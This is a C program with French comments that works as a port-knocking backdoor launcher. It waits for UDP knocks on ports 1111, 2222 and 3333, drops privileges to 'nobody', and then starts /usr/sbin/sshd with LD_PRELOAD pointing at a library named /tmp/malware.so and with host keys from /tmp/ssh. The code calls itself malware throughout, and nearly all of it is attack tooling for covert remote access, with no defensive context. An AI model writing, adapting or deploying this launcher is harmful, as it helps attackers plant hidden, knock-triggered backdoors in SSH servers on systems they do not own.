#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <pwd.h>

#define KNOCK_PORT_1 1111
#define KNOCK_PORT_2 2222
#define KNOCK_PORT_3 3333
#define SSHD_PATH "/usr/sbin/sshd"
#define MALWARE_PATH "/tmp/malware.so"
#define SSH_CONFIG_DIR "/tmp/ssh"

void drop_privileges() {
    struct passwd *pw = getpwnam("nobody");  // Exécution sous "nobody"
    if (pw) {
        setgid(pw->pw_gid);
        setuid(pw->pw_uid);
        setgroups(0, NULL);
        printf("[INFO] Privilèges réduits, exécution en tant que nobody.\n");
    } else {
        printf("[ERROR] de changer d'utilisateur.\n");
        exit(1);
    }
}

void start_malware() {
    printf("[INFO] ✅ Séquence Knock reçue, lancement du malware...\n");

    // system("sudo chown -R nobody:nogroup /tmp/ssh && sudo chmod 600 /tmp/ssh/ssh_host_* && sudo chmod 700 /tmp/ssh");


    // Réduction des privilèges AVANT de lancer le malware
    drop_privileges();

    // Vérification des clés SSH
    if (access(SSH_CONFIG_DIR "/ssh_host_rsa_key", F_OK) != 0 ||
    access(SSH_CONFIG_DIR "/ssh_host_ecdsa_key", F_OK) != 0 ||
    access(SSH_CONFIG_DIR "/ssh_host_ed25519_key", F_OK) != 0) {
    printf("[ERROR] Clés SSH manquantes ! Exécution impossible.\n");
    exit(1);
}


    // Lancer sshd avec LD_PRELOAD en mode démon avec les clés du dossier temporaire
    char *envp[] = { "LD_PRELOAD=" MALWARE_PATH, NULL };
    char *args[] = {
        SSHD_PATH, "-D",
        "-f", SSH_CONFIG_DIR "/sshd_config",
        "-h", SSH_CONFIG_DIR "/ssh_host_rsa_key",
        "-h", SSH_CONFIG_DIR "/ssh_host_dsa_key",
        "-h", SSH_CONFIG_DIR "/ssh_host_ecdsa_key",
        "-h", SSH_CONFIG_DIR "/ssh_host_ed25519_key",
        NULL
    };

    execve(SSHD_PATH, args, envp);

    // Si execve échoue
    perror("[ERROR] Échec du lancement de sshd avec LD_PRELOAD");
    exit(1);
}

int main() {
    int sock[3];
    struct sockaddr_in server_addr[3], client_addr;
    socklen_t addr_size;
    char buffer[1024];

    int knock_ports[] = {KNOCK_PORT_1, KNOCK_PORT_2, KNOCK_PORT_3};
    int knock_received[3] = {0, 0, 0};

    // Création de sockets distincts pour chaque port
    for (int i = 0; i < 3; i++) {
        sock[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock[i] < 0) {
            perror("Erreur socket");
            exit(1);
        }

        memset(&server_addr[i], 0, sizeof(server_addr[i]));
        server_addr[i].sin_family = AF_INET;
        server_addr[i].sin_addr.s_addr = INADDR_ANY;
        server_addr[i].sin_port = htons(knock_ports[i]);

        if (bind(sock[i], (struct sockaddr*)&server_addr[i], sizeof(server_addr[i])) < 0) {
            perror("Erreur bind");
            exit(1);
        }
    }

    printf("[INFO] En attente du knock secret...\n");

    // Attente des knocks dans l'ordre
    for (int i = 0; i < 3; i++) {
        addr_size = sizeof(client_addr);
        recvfrom(sock[i], buffer, sizeof(buffer), 0, (struct sockaddr*)&client_addr, &addr_size);
        printf("[INFO] Knock reçu sur le port %d\n", knock_ports[i]);
        knock_received[i] = 1;
    }

    // Vérification si la séquence complète est reçue
    if (knock_received[0] && knock_received[1] && knock_received[2]) {
        start_malware();
    } else {
        printf("[ERROR] Séquence incorrecte, malware NON lancé !\n");
    }

    // Fermeture des sockets
    for (int i = 0; i < 3; i++) {
        close(sock[i]);
    }

    return 0;
}
